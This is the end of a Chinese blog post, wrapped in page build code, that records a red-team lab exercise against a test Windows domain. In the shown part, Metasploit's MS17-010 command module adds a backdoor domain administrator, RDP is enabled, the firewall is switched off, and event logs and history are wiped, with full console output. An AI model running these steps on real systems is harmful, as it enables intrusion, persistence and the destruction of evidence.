<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>照理来说，前面创建后门的时候创建的perry用户是再GOD下的，所以这里应该也可以不建，但保险起见也可以再建一次</p><blockquote><p>net user /add perry Aa123456 /domain</p><p>net localgroup administrators /add god\\perry</p></blockquote><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">msf6 auxiliary(admin/smb/ms17_010_command) &gt; set command net user /add perry Aa123456 /domain</span>
<span class="line">command =&gt; net user /add perry Aa123456 /domain</span>
<span class="line">msf6 auxiliary(admin/smb/ms17_010_command) &gt; run</span>
<span class="line"></span>
<span class="line">[*] 192.168.52.141:445    - Target OS: Windows Server 2003 3790</span>
<span class="line">[*] 192.168.52.141:445    - Filling barrel with fish... done</span>
<span class="line">[*] 192.168.52.141:445    - &lt;---------------- | Entering Danger Zone | ----------------&gt;</span>
<span class="line">[*] 192.168.52.141:445    -     [*] Preparing dynamite...</span>
<span class="line">[*] 192.168.52.141:445    -             Trying stick 1 (x64)...Miss</span>
<span class="line">[*] 192.168.52.141:445    -             [*] Trying stick 2 (x86)...Boom!</span>
<span class="line">[*] 192.168.52.141:445    -     [+] Successfully Leaked Transaction!</span>
<span class="line">[*] 192.168.52.141:445    -     [+] Successfully caught Fish-in-a-barrel</span>
<span class="line">[*] 192.168.52.141:445    - &lt;---------------- | Leaving Danger Zone | ----------------&gt;</span>
<span class="line">[*] 192.168.52.141:445    - Reading from CONNECTION struct at: 0x87a02ae0</span>
<span class="line">[*] 192.168.52.141:445    - Built a write-what-where primitive...</span>
<span class="line">[+] 192.168.52.141:445    - Overwrite complete... SYSTEM session obtained!</span>
<span class="line">[+] 192.168.52.141:445    - Service start timed out, OK if running a command or non-service executable...</span>
<span class="line">[*] 192.168.52.141:445    - Getting the command output...</span>
<span class="line">[*] 192.168.52.141:445    - Executing cleanup...</span>
<span class="line">[+] 192.168.52.141:445    - Cleanup was successful</span>
<span class="line">[+] 192.168.52.141:445    - Command completed successfully!</span>
<span class="line">[*] 192.168.52.141:445    - Output for &quot;net user /add perry Aa123456 /domain&quot;:</span>
<span class="line"></span>
<span class="line">The request will be processed at a domain controller for domain god.org.</span>
<span class="line"></span>
<span class="line"></span>
<span class="line"></span>
<span class="line">[*] 192.168.52.141:445    - Scanned 1 of 1 hosts (100% complete)</span>
<span class="line">[*] Auxiliary module execution completed</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">msf6 auxiliary(admin/smb/ms17_010_command) &gt; set command net localgroup administrators /add god\\\\perry</span>
<span class="line">command =&gt; net localgroup administrators /add god\\perry</span>
<span class="line">msf6 auxiliary(admin/smb/ms17_010_command) &gt; run</span>
<span class="line"></span>
<span class="line">[*] 192.168.52.141:445    - Target OS: Windows Server 2003 3790</span>
<span class="line">[*] 192.168.52.141:445    - Filling barrel with fish... done</span>
<span class="line">[*] 192.168.52.141:445    - &lt;---------------- | Entering Danger Zone | ----------------&gt;</span>
<span class="line">[*] 192.168.52.141:445    -     [*] Preparing dynamite...</span>
<span class="line">[*] 192.168.52.141:445    -             Trying stick 1 (x64)...Miss</span>
<span class="line">[*] 192.168.52.141:445    -             [*] Trying stick 2 (x86)...Boom!</span>
<span class="line">[*] 192.168.52.141:445    -     [+] Successfully Leaked Transaction!</span>
<span class="line">[*] 192.168.52.141:445    -     [+] Successfully caught Fish-in-a-barrel</span>
<span class="line">[*] 192.168.52.141:445    - &lt;---------------- | Leaving Danger Zone | ----------------&gt;</span>
<span class="line">[*] 192.168.52.141:445    - Reading from CONNECTION struct at: 0x87a26cc8</span>
<span class="line">[*] 192.168.52.141:445    - Built a write-what-where primitive...</span>
<span class="line">[+] 192.168.52.141:445    - Overwrite complete... SYSTEM session obtained!</span>
<span class="line">[+] 192.168.52.141:445    - Service start timed out, OK if running a command or non-service executable...</span>
<span class="line">[*] 192.168.52.141:445    - Getting the command output...</span>
<span class="line">[*] 192.168.52.141:445    - Executing cleanup...</span>
<span class="line">[+] 192.168.52.141:445    - Cleanup was successful</span>
<span class="line">[+] 192.168.52.141:445    - Command completed successfully!</span>
<span class="line">[*] 192.168.52.141:445    - Output for &quot;net localgroup administrators /add god\\perry&quot;:</span>
<span class="line"></span>
<span class="line">The command completed successfully.</span>
<span class="line"></span>
<span class="line"></span>
<span class="line"></span>
<span class="line">[*] 192.168.52.141:445    - Scanned 1 of 1 hosts (100% complete)</span>
<span class="line">[*] Auxiliary module execution completed</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>启用远程桌面</p><blockquote><p>netstat -ano | findstr &quot;3389&quot; # 查看端口3389是否开启 REG query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server\\WinStations\\RDP-Tcp /v PortNumber # 查看远程端口 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f # 开启3389端口 netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow # 允许 3389 端口放行 netsh firewall set opmode disable # Windows Server 2003 系统及之前版本 netsh advfirewall set allprofiles state off # Windows Server 2003 之后系统版本</p></blockquote><p>剩下略，参考&quot;远程登陆-启用远程桌面-MSF部分&quot;</p><p>**域控渗透方法域上述基本一致，<s>省略</s> **</p><p>需要注意的是，域控通过策略组禁用了远程桌面，方法会有点不一样。</p><p>当然，不建议进行以下操作，毕竟在实际环境中并碰不到域控。</p><blockquote><p>计算机配置 —&gt; 管理模板 —&gt; Windows组件 —&gt; 远程桌面服务 —&gt; 远程桌面会话主机 —&gt; 连接，允许用户通过使用远程桌面服务进行远程连接</p></blockquote><p><img src="`+ds+`" alt="image-20220815174304021"></p><h2 id="清除痕迹" tabindex="-1"><a class="header-anchor" href="#清除痕迹"><span>清除痕迹</span></a></h2><p><strong>清除日志</strong></p><blockquote><p>meterperter自带清除日志功能： clearev # 可清除windows中的应用程序日志、系统日志、安全日志</p></blockquote><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">&gt;</span> sessions </span>
<span class="line"></span>
<span class="line">Active sessions</span>
<span class="line"><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></span>
<span class="line"></span>
<span class="line">  Id  Name  Type                     Information               Connection</span>
<span class="line">  --  ----  ----                     -----------               ----------</span>
<span class="line">  <span class="token number">1</span>         meterpreter x64/windows  GOD<span class="token punctuation">\\</span>Administrator @ STU1  <span class="token number">192.168</span>.220.137:9999 -<span class="token operator">&gt;</span> <span class="token number">192.168</span>.220.138:7465  <span class="token punctuation">(</span><span class="token number">192.168</span>.220.138<span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">&gt;</span> sessions <span class="token number">1</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting interaction with <span class="token number">1</span><span class="token punctuation">..</span>.</span>
<span class="line"></span>
<span class="line">meterpreter <span class="token operator">&gt;</span> clearev</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Wiping <span class="token number">1756</span> records from Application<span class="token punctuation">..</span>.</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Wiping <span class="token number">5230</span> records from System<span class="token punctuation">..</span>.</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Wiping <span class="token number">1842</span> records from Security<span class="token punctuation">..</span>.</span>
<span class="line">meterpreter <span class="token operator">&gt;</span> shell</span>
<span class="line">Process <span class="token number">2000</span> created.</span>
<span class="line">Channel <span class="token number">11</span> created.</span>
<span class="line">Microsoft Windows <span class="token punctuation">[</span>�汾 <span class="token number">6.1</span>.7601<span class="token punctuation">]</span></span>
<span class="line">��Ȩ���� <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2009</span> Microsoft Corporation����������Ȩ����</span>
<span class="line"></span>
<span class="line">c:<span class="token punctuation">\\</span><span class="token operator">&gt;</span>del /f /s /q “%userprofile%<span class="token punctuation">\\</span>Recent*.*</span>
<span class="line">del /f /s /q ��?userprofile%<span class="token punctuation">\\</span>Recent*.*</span>
<span class="line">�ļ�����Ŀ¼���������﷨����ȷ��</span>
<span class="line"></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>清除历史</strong>：<code>del /f /s /q “%userprofile%\\Recent*.*</code></p><p>*：就是要清除 <code>C:\\Users\\[userName]\\Recent</code> 里的所有内容</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">msf6 auxiliary(admin/smb/ms17_010_command) &gt; set command del /f /s /q “%userprofile%\\Recent*.*</span>
<span class="line">command =&gt; del /f /s /q “%userprofile%Recent*.*</span>
<span class="line">msf6 auxiliary(admin/smb/ms17_010_command) &gt; run</span>
<span class="line"></span>
<span class="line">[*] 192.168.52.141:445    - Target OS: Windows Server 2003 3790</span>
<span class="line">[*] 192.168.52.141:445    - Filling barrel with fish... done</span>
<span class="line">[*] 192.168.52.141:445    - &lt;---------------- | Entering Danger Zone | ----------------&gt;</span>
<span class="line">[*] 192.168.52.141:445    -     [*] Preparing dynamite...</span>
<span class="line">[*] 192.168.52.141:445    -             Trying stick 1 (x64)...Miss</span>
<span class="line">[*] 192.168.52.141:445    -             [*] Trying stick 2 (x86)...Boom!</span>
<span class="line">[*] 192.168.52.141:445    -     [+] Successfully Leaked Transaction!</span>
<span class="line">[*] 192.168.52.141:445    -     [+] Successfully caught Fish-in-a-barrel</span>
<span class="line">[*] 192.168.52.141:445    - &lt;---------------- | Leaving Danger Zone | ----------------&gt;</span>
<span class="line">[*] 192.168.52.141:445    - Reading from CONNECTION struct at: 0x87d12d60</span>
<span class="line">[*] 192.168.52.141:445    - Built a write-what-where primitive...</span>
<span class="line">[+] 192.168.52.141:445    - Overwrite complete... SYSTEM session obtained!</span>
<span class="line">[+] 192.168.52.141:445    - Service start timed out, OK if running a command or non-service executable...</span>
<span class="line">[*] 192.168.52.141:445    - Getting the command output...</span>
<span class="line">[*] 192.168.52.141:445    - Command finished with no output</span>
<span class="line">[*] 192.168.52.141:445    - Executing cleanup...</span>
<span class="line">[+] 192.168.52.141:445    - Cleanup was successful</span>
<span class="line">[+] 192.168.52.141:445    - Command completed successfully!</span>
<span class="line">[*] 192.168.52.141:445    - Output for &quot;del /f /s /q “%userprofile%Recent*.*&quot;:</span>
<span class="line"></span>
<span class="line"></span>
<span class="line"></span>
<span class="line">[*] 192.168.52.141:445    - Scanned 1 of 1 hosts (100% complete)</span>
<span class="line">[*] Auxiliary module execution completed</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="常见问题" tabindex="-1"><a class="header-anchor" href="#常见问题"><span>常见问题</span></a></h2><p><strong>端口占用</strong></p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span> Handler failed to <span class="token builtin class-name">bind</span> to <span class="token number">192.168</span>.220.137:9999:-  -</span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span> Handler failed to <span class="token builtin class-name">bind</span> to <span class="token number">0.0</span>.0.0:9999:-  -</span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span> Exploit failed <span class="token punctuation">[</span>bad-config<span class="token punctuation">]</span>: Rex::BindFailed The address is already <span class="token keyword">in</span> use or unavailable: <span class="token punctuation">(</span><span class="token number">0.0</span>.0.0:9999<span class="token punctuation">)</span>.</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploit completed, but no session was created.</span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> sessions i</span>
<span class="line"></span>
<span class="line">Active sessions</span>
<span class="line"><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></span>
<span class="line"></span>
<span class="line">No active sessions.</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>解决：</p><blockquote><p>netstat -tulpen</p><p>fuser -k 9999/tcp</p></blockquote><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token function">netstat</span> <span class="token parameter variable">-tulpen</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> exec: <span class="token function">netstat</span> <span class="token parameter variable">-tulpen</span></span>
<span class="line"></span>
<span class="line">Active Internet connections <span class="token punctuation">(</span>only servers<span class="token punctuation">)</span></span>
<span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    </span>
<span class="line">tcp6       <span class="token number">0</span>      <span class="token number">0</span> :::50050                :::*                    LISTEN      <span class="token number">0</span>          <span class="token number">221354</span>     <span class="token number">74832</span>/java          </span>
<span class="line">tcp6       <span class="token number">0</span>      <span class="token number">0</span> :::9999                 :::*                    LISTEN      <span class="token number">0</span>          <span class="token number">221355</span>     <span class="token number">74832</span>/java          </span>
<span class="line">tcp6       <span class="token number">0</span>      <span class="token number">0</span> :::80                   :::*                    LISTEN      <span class="token number">0</span>          <span class="token number">221356</span>     <span class="token number">74832</span>/java          </span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token function">fuser</span> <span class="token parameter variable">-k</span> <span class="token number">9999</span>/tcp</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> exec: <span class="token function">fuser</span> <span class="token parameter variable">-k</span> <span class="token number">9999</span>/tcp</span>
<span class="line"></span>
<span class="line"><span class="token number">9999</span>/tcp:            <span class="token number">74832</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,220))])}const fs=l(ms,[["render",ks]]),gs=JSON.parse('{"path":"/blogs/xxbj/Network_Security/st1.html","title":"ATT&cK实战系列—红队实战(一)","lang":"en-US","frontmatter":{"title":"ATT&cK实战系列—红队实战(一)","date":"2022-08-15T00:00:00.000Z","tags":["网络安全"],"categories":["学习笔记"]},"headers":[{"level":2,"title":"环境搭建","slug":"环境搭建","link":"#环境搭建","children":[]},{"level":2,"title":"信息收集","slug":"信息收集","link":"#信息收集","children":[{"level":3,"title":"目录扫描","slug":"目录扫描","link":"#目录扫描","children":[]}]},{"level":2,"title":"指纹识别","slug":"指纹识别","link":"#指纹识别","children":[{"level":3,"title":"Whatweb","slug":"whatweb","link":"#whatweb","children":[]},{"level":3,"title":"御剑Web指纹识别/大禹CMS系统识别","slug":"御剑web指纹识别-大禹cms系统识别","link":"#御剑web指纹识别-大禹cms系统识别","children":[]}]},{"level":2,"title":"漏洞分析","slug":"漏洞分析","link":"#漏洞分析","children":[]},{"level":2,"title":"渗透攻击","slug":"渗透攻击","link":"#渗透攻击","children":[{"level":3,"title":"制作并上传木马","slug":"制作并上传木马","link":"#制作并上传木马","children":[]}]},{"level":2,"title":"内网渗透","slug":"内网渗透","link":"#内网渗透","children":[{"level":3,"title":"ARP扫内网主机","slug":"arp扫内网主机","link":"#arp扫内网主机","children":[]},{"level":3,"title":"判断域控","slug":"判断域控","link":"#判断域控","children":[]},{"level":3,"title":"msf起代理 (nmap失败)","slug":"msf起代理-nmap失败","link":"#msf起代理-nmap失败","children":[]}]},{"level":2,"title":"权限提升","slug":"权限提升","link":"#权限提升","children":[{"level":3,"title":"法一：MSF","slug":"法一-msf","link":"#法一-msf","children":[]},{"level":3,"title":"法二：使用CS模块 (含渗透)","slug":"法二-使用cs模块-含渗透","link":"#法二-使用cs模块-含渗透","children":[]}]},{"level":2,"title":"远程登陆","slug":"远程登陆","link":"#远程登陆","children":[{"level":3,"title":"获取密码","slug":"获取密码","link":"#获取密码","children":[]},{"level":3,"title":"启用远程桌面","slug":"启用远程桌面","link":"#启用远程桌面","children":[]}]},{"level":2,"title":"权限维持","slug":"权限维持","link":"#权限维持","children":[{"level":3,"title":"Guest后门","slug":"guest后门","link":"#guest后门","children":[]},{"level":3,"title":"添加新用户后门","slug":"添加新用户后门","link":"#添加新用户后门","children":[]},{"level":3,"title":"尴尬之处","slug":"尴尬之处","link":"#尴尬之处","children":[]}]},{"level":2,"title":"横向探测","slug":"横向探测","link":"#横向探测","children":[{"level":3,"title":"法一：MSF (*这里也写了ProxyChains)","slug":"法一-msf-这里也写了proxychains","link":"#法一-msf-这里也写了proxychains","children":[]},{"level":3,"title":"法二：CS","slug":"法二-cs-1","link":"#法二-cs-1","children":[]}]},{"level":2,"title":"横向移动","slug":"横向移动","link":"#横向移动","children":[]},{"level":2,"title":"清除痕迹","slug":"清除痕迹","link":"#清除痕迹","children":[]},{"level":2,"title":"常见问题","slug":"常见问题","link":"#常见问题","children":[]}],"git":{"createdTime":1748156404000,"updatedTime":1748156404000,"contributors":[{"name":"PPPerryPan","email":"perrypan0123@outlook.com","commits":1}]},"filePathRelative":"blogs/xxbj/Network_Security/st1.md"}');import.meta.webpackHot&&(import.meta.webpackHot.accept(),__VUE_HMR_RUNTIME__.updatePageData&&__VUE_HMR_RUNTIME__.updatePageData(gs));export{fs as comp,gs as data};
